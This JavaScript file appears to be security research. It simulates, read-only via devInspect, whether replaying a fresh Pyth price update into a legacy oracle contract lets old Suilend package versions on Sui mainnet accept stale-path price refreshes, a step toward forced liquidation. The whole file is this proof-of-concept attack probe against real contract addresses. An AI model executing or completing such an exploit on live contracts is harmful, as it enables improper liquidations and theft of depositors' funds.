// DECISIVE TEST (read-only devInspect): can an attacker satisfy old-package price freshness
// by replaying a fresh Pro-update VAA/accumulator to the LEGACY Pyth contract, then calling
// v18 refresh_reserve_price + v18 liquidate in one all-old PTB?
import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { readFileSync } from 'fs';

const payload = JSON.parse(readFileSync(new URL('./pro_update_payload.json', import.meta.url)));
const c = new SuiClient({ url: 'https://sui.publicnode.com' });
const S = '0x7da6872f15af113ffacbe83a8c2cfb03cc0f9fb1283f9434b053e9639668155b';
const MAIN = '0xf95b06141ed4a174f239417323bde3f209b972f5930d8521ea38a52aff3a6ddf::suilend::MAIN_POOL';
const MARKET = '0x84030d26d85eaa7035084a057f2f11f701b7e2e4eda87551becbc7c97505ece1';
const V18 = '0xdf48a8edf980a895be1719a74801308ebf634fb4d759017f7650d96196bd14e8';
const V25 = '0x59672975e15c58ffc9450f5236b6aa9fa2407d94b8081e634778aa01957d8c6f';
const LEGACY_PYTH_ORIG = '0x04e20ddf36af412a4096f9014f4a565af9e812db9a05cc40254846cf6ed0ad91';
const WORMHOLE = '0x5306f64e312b581766351c07af79c72fcb1cd25147157fdc2f8ad76de9a3fb6a';
const WORMHOLE_STATE = '0xaeab97f96cf9877fee2883315d459552b2b921edc16d7ceac6eab944dd88919c';
const LEGACY_STATE = '0x1f9310238ee9298fb703c3419030b35b22bb1cc37113e3bb5007c99aec79e5b8';
const LEG_SUI = '0x801dbc2f0053d34734814b2d6df491ce7807a725fe9a01ad74a07e9c51396c37';
const LEG_F1 = '0x9d0d275efbd37d8a8855f6f2c761fa5983293dd8ce202ee5196626de8fcd4469';
const LEG_F2 = '0x34d6e013b9dcb3a899f69dda802af9a8afa2193e4049683479c395ea9a5cfbb8';
const SUI_COIN = '0xd50be15d08c079e97c491cde1aabbdb338a331417511a529e039d316b428430e';

const vaa = Uint8Array.from(Buffer.from(payload.vaa, 'hex'));
const acc = Uint8Array.from(Buffer.from(payload.accumulator, 'hex'));

function buildTx(refreshPkg, doLiquidate) {
  const tx = new Transaction();
  tx.setSender(S);
  const fees = tx.splitCoins(tx.object(SUI_COIN), [1, 1, 1]);
  const verified = tx.moveCall({
    target: `${WORMHOLE}::vaa::parse_and_verify`,
    arguments: [tx.object(WORMHOLE_STATE), tx.pure.vector('u8', vaa), tx.object('0x6')],
  });
  let potato = tx.moveCall({
    target: `${LEGACY_PYTH_ORIG}::pyth::create_authenticated_price_infos_using_accumulator`,
    arguments: [tx.object(LEGACY_STATE), tx.pure.vector('u8', acc), verified, tx.object('0x6')],
  });
  for (const [obj, fee] of [[LEG_SUI, fees[0]], [LEG_F1, fees[1]], [LEG_F2, fees[2]]]) {
    potato = tx.moveCall({
      target: `${LEGACY_PYTH_ORIG}::pyth::update_single_price_feed`,
      arguments: [tx.object(LEGACY_STATE), potato, tx.object(obj), fee, tx.object('0x6')],
    });
  }
  tx.moveCall({ target: `${LEGACY_PYTH_ORIG}::hot_potato_vector::destroy`, arguments: [potato] });
  // now old-package refresh with the legacy object
  tx.moveCall({
    target: `${refreshPkg}::lending_market::refresh_reserve_price`,
    typeArguments: [MAIN],
    arguments: [tx.object(MARKET), tx.pure.u64(0), tx.object('0x6'), tx.object(LEG_SUI)],
  });
  return tx;
}

for (const [label, pkg] of [['v18', V18], ['v10', '0xe37cc7bb50fd9b6dbd3873df66fa2c554e973697f50ef97707311dc78bd08444'], ['v20', '0x3d4353f3bd3565329655e6b77bc2abfd31e558b86662ebd078ae453d416bc10f'], ['v25-pro', V25]]) {
  try {
    const tx = buildTx(pkg);
    const r = await c.devInspectTransactionBlock({ sender: S, transactionBlock: tx });
    const st = r.effects.status;
    const m = /(\d+)\) in command/.exec(JSON.stringify(st.error || ''));
    console.log(label, 'refresh+update =>', st.status, m ? 'code ' + m[1] : '', st.status === 'failure' ? JSON.stringify(st.error).slice(0, 200) : '');
  } catch (e) {
    console.log(label, 'RPC_ERR', String(e).slice(0, 200));
  }
}
